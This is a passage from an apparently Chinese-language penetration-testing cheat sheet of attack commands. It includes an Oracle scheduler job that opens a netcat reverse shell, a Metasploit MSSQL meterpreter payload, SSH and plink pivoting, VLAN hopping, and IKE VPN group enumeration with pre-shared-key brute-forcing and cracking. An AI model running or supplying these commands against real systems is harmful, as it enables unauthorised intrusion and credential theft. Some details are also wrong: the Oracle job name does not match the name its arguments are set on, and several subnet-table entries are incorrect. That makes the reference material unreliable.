</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>begin
</span></span><span style=display:flex><span>dbms_scheduler.create_job( job_name    =&gt; &#39;MEH1337&#39;,job_type    =&gt;
</span></span><span style=display:flex><span>    &#39;EXECUTABLE&#39;,job_action =&gt; &#39;/bin/nc&#39;,number_of_arguments =&gt; 4,start_date =&gt;
</span></span><span style=display:flex><span>    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); 
</span></span><span style=display:flex><span>dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 1, &#39;TARGET-IP&#39;);
</span></span><span style=display:flex><span>dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 2, &#39;443&#39;);
</span></span><span style=display:flex><span>dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 3, &#39;-e&#39;);
</span></span><span style=display:flex><span>dbms_scheduler.set_job_argument_value(&#39;rev_shell&#39;, 4, &#39;/bin/bash&#39;);
</span></span><span style=display:flex><span>dbms_scheduler.enable(&#39;rev_shell&#39;); 
</span></span><span style=display:flex><span>end; 
</span></span></code></pre></td></tr></table></div></div><h3 id=mssql>MSSQL<a hidden class=anchor aria-hidden=true href=#mssql>#</a></h3><p>枚举/发现</p><p>Nmap</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-49-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-49-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
</span></span></code></pre></td></tr></table></div></div><p>Metasploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-50-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-50-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf &gt; use auxiliary/scanner/mssql/mssql_ping
</span></span></code></pre></td></tr></table></div></div><h4 id=爆破-mssql登陆>爆破 MSSQL登陆<a hidden class=anchor aria-hidden=true href=#爆破-mssql登陆>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-51-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-51-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf &gt; use auxiliary/admin/mssql/mssql_enum
</span></span></code></pre></td></tr></table></div></div><h4 id=metasploit-mssql-shell>Metasploit MSSQL Shell<a hidden class=anchor aria-hidden=true href=#metasploit-mssql-shell>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-52-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-52-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf &gt; use exploit/windows/mssql/mssql_payload
</span></span><span style=display:flex><span>msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table></div></div><h2 id=网络>网络<a hidden class=anchor aria-hidden=true href=#网络>#</a></h2><h3 id=plinkexe-隧道>Plink.exe 隧道<a hidden class=anchor aria-hidden=true href=#plinkexe-隧道>#</a></h3><p>PuTTY Link 隧道</p><p>转发运程端口到本地地址：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-53-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-53-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>plink.exe -P 22 -l root -pw &#34;1337&#34; -R 445:127.0.0.1:445 REMOTE-IP
</span></span></code></pre></td></tr></table></div></div><h3 id=跳板pivoting>跳板（Pivoting）<a hidden class=anchor aria-hidden=true href=#跳板pivoting>#</a></h3><h4 id=ssh-跳板ssh-pivoting>SSH 跳板（ssh Pivoting）<a hidden class=anchor aria-hidden=true href=#ssh-跳板ssh-pivoting>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
</span></span></code></pre></td></tr></table></div></div><p>需在<code> /etc/proxychains.conf</code> 添加sock4 <code>127.0.0.1 1010</code></p><p>利用SSH跳板跨越网络</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
</span></span></code></pre></td></tr></table></div></div><p>需在<code> /etc/proxychains.conf</code> 添加sock4 <code>127.0.0.1 1010</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
</span></span></code></pre></td></tr></table></div></div><p>在<code> /etc/proxychains.conf</code> 添加sock4 <code>127.0.0.1 1011</code></p><h4 id=meterpreter-pivoting>Meterpreter Pivoting<a hidden class=anchor aria-hidden=true href=#meterpreter-pivoting>#</a></h4><h3 id=ttl-指纹识别>TTL 指纹识别<a hidden class=anchor aria-hidden=true href=#ttl-指纹识别>#</a></h3><table><thead><tr><th>操作系统</th><th>TTL 值</th></tr></thead><tbody><tr><td>Windows</td><td><code>128</code></td></tr><tr><td>Linux</td><td><code>64</code></td></tr><tr><td>Solaris</td><td><code>255</code></td></tr><tr><td>Cisco / Network</td><td><code>255</code></td></tr></tbody></table><h3 id=ipv4-速查>IPv4 速查<a hidden class=anchor aria-hidden=true href=#ipv4-速查>#</a></h3><h4 id=各类ip的地址范围>各类IP的地址范围<a hidden class=anchor aria-hidden=true href=#各类ip的地址范围>#</a></h4><table><thead><tr><th>类别</th><th>IP 地址范围</th></tr></thead><tbody><tr><td>A类</td><td><code>0.0.0.0 - 127.255.255.255</code></td></tr><tr><td>B类</td><td><code>128.0.0.0 - 191.255.255.255</code></td></tr><tr><td>C类</td><td><code>192.0.0.0 - 223.255.255.255</code></td></tr><tr><td>D类</td><td><code>224.0.0.0 - 239.255.255.255</code></td></tr><tr><td>E类</td><td><code>240.0.0.0 - 255.255.255.255</code></td></tr></tbody></table><h4 id=ipv4私有地址>IPv4私有地址<a hidden class=anchor aria-hidden=true href=#ipv4私有地址>#</a></h4><table><thead><tr><th>类别</th><th>范围</th></tr></thead><tbody><tr><td>A类私有地址</td><td><code>10.0.0.0 - 10.255.255.255</code></td></tr><tr><td>B类私有地址</td><td><code>172.16.0.0 - 172.31.255.255</code></td></tr><tr><td>C类私有地址</td><td><code>192.168.0.0 - 192.168.255.255</code></td></tr><tr><td></td><td><code>127.0.0.0 - 127.255.255.255</code></td></tr></tbody></table><h4 id=ipv4子网速查表>IPv4子网速查表<a hidden class=anchor aria-hidden=true href=#ipv4子网速查表>#</a></h4><p>和渗透测试关系不太大，但确实很有用。</p><table><thead><tr><th>CIDR</th><th>十进制掩码</th><th>主机数量</th></tr></thead><tbody><tr><td>/31</td><td><code>255.255.255.254</code></td><td><code>1 Host</code></td></tr><tr><td>/30</td><td><code>255.255.255.252</code></td><td><code>2 Hosts</code></td></tr><tr><td>/29</td><td><code>255.255.255.249</code></td><td><code>6 Hosts</code></td></tr><tr><td>/28</td><td><code>255.255.255.240</code></td><td><code>14 Hosts</code></td></tr><tr><td>/27</td><td><code>255.255.255.224</code></td><td><code>30 Hosts</code></td></tr><tr><td>/26</td><td><code>255.255.255.192</code></td><td><code>62 Hosts</code></td></tr><tr><td>/25</td><td><code>255.255.255.128</code></td><td><code>126 Hosts</code></td></tr><tr><td>/24</td><td><code>255.255.255.0</code></td><td><code>254 Hosts</code></td></tr><tr><td>/23</td><td><code>255.255.254.0</code></td><td><code>512 Host</code></td></tr><tr><td>/22</td><td><code>255.255.252.0</code></td><td><code>1022 Hosts</code></td></tr><tr><td>/21</td><td><code>255.255.248.0</code></td><td><code>2046 Hosts</code></td></tr><tr><td>/20</td><td><code>255.255.240.0</code></td><td><code>4094 Hosts</code></td></tr><tr><td>/19</td><td><code>255.255.224.0</code></td><td><code>8190 Hosts</code></td></tr><tr><td>/18</td><td><code>255.255.192.0</code></td><td><code>16382 Hosts</code></td></tr><tr><td>/17</td><td><code>255.255.128.0</code></td><td><code>32766 Hosts</code></td></tr><tr><td>/16</td><td><code>255.255.0.0</code></td><td><code>65534 Hosts</code></td></tr><tr><td>/15</td><td><code>255.254.0.0</code></td><td><code>131070 Hosts</code></td></tr><tr><td>/14</td><td><code>255.252.0.0</code></td><td><code>262142 Hosts</code></td></tr><tr><td>/13</td><td><code>255.248.0.0</code></td><td><code>524286 Hosts</code></td></tr><tr><td>/12</td><td><code>255.240.0.0</code></td><td><code>1048674 Hosts</code></td></tr><tr><td>/11</td><td><code>255.224.0.0</code></td><td><code>2097150 Hosts</code></td></tr><tr><td>/10</td><td><code>255.192.0.0</code></td><td><code>4194302 Hosts</code></td></tr><tr><td>/9</td><td><code>255.128.0.0</code></td><td><code>8388606 Hosts</code></td></tr><tr><td>/8</td><td><code>255.0.0.0</code></td><td><code>16777214 Hosts</code></td></tr></tbody></table><h3 id=vlan-hopping跳跃攻击>VLAN hopping（跳跃攻击）<a hidden class=anchor aria-hidden=true href=#vlan-hopping跳跃攻击>#</a></h3><p>使用nccgroup 的脚本简化攻击过程</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>git clone https://github.com/nccgroup/vlan-hopping.git
</span></span><span style=display:flex><span>chmod 700 frogger.sh
</span></span><span style=display:flex><span>./frogger.sh 
</span></span></code></pre></td></tr></table></div></div><h3 id=vpn测试工具>VPN测试工具<a hidden class=anchor aria-hidden=true href=#vpn测试工具>#</a></h3><p>识别VPN服务器</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./udp-protocol-scanner.pl -p ike TARGET(s)
</span></span></code></pre></td></tr></table></div></div><p>扫描VPN服务器网段：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./udp-protocol-scanner.pl -p ike -f ip.txt
</span></span></code></pre></td></tr></table></div></div><h4 id=ikeforce>IKEForce<a hidden class=anchor aria-hidden=true href=#ikeforce>#</a></h4><p>使用IKEForce枚举或对 VPN 服务器进行字典攻击.</p><p>安装:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>pip install pyip
</span></span><span style=display:flex><span>git clone https://github.com/SpiderLabs/ikeforce.git
</span></span></code></pre></td></tr></table></div></div><p>使用IKEForce对IKE VPN 进行枚举：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
</span></span></code></pre></td></tr></table></div></div><p>使用 IKEForce 爆破 IKE VPN:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-62-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-62-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ike-scan
</span></span><span style=display:flex><span>ike-scan TARGET-IP
</span></span><span style=display:flex><span>ike-scan -A TARGET-IP
</span></span><span style=display:flex><span>ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
</span></span></code></pre></td></tr></table></div></div><h4 id=ike-激进模式-psk-破解>IKE 激进模式 PSK 破解<a hidden class=anchor aria-hidden=true href=#ike-激进模式-psk-破解>#</a></h4><ol><li>验证VPN服务器</li><li>使用 IKEForce 枚举来获得组ID</li><li>使用 ike-scan 从IKE 终端抓取 PSK 哈希</li><li>使用 psk-crack 破解哈希</li></ol><h5 id=step-1-验证ike服务器>Step 1: 验证IKE服务器<a hidden class=anchor aria-hidden=true href=#step-1-验证ike服务器>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./udp-protocol-scanner.pl -p ike SUBNET/24
</span></span></code></pre></td></tr></table></div></div><h5 id=step-2使用ikeforce枚举组名>Step 2:使用IKEForce枚举组名<a hidden class=anchor aria-hidden=true href=#step-2使用ikeforce枚举组名>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
</span></span></code></pre></td></tr></table></div></div><h5 id=step-3-使用ike-scan抓取psk哈希>Step 3: 使用ike-scan抓取PSK哈希<a hidden class=anchor aria-hidden=true href=#step-3-使用ike-scan抓取psk哈希>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
</span></span></code></pre></td></tr></table></div></div><h5 id=step-4-使用psk-crack-破解psk-哈希>Step 4: 使用psk-crack 破解PSK 哈希<a hidden class=anchor aria-hidden=true href=#step-4-使用psk-crack-破解psk-哈希>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>psk-crack hash-file.txt
</span></span></code></pre></td></tr></table></div></div><p>高级psk-crack 选项:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-68-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-68-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-68-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-68-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-68-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-68-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-68-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-68-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>pskcrack
</span></span><span style=display:flex><span>psk-crack -b 5 TARGET-IPkey
</span></span><span style=display:flex><span>psk-crack -b 5 --charset=&#34;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#34; 192-168-207-134key
</span></span><span style=display:flex><span>psk-crack -d /path/to/dictionary-file TARGET-IP-key
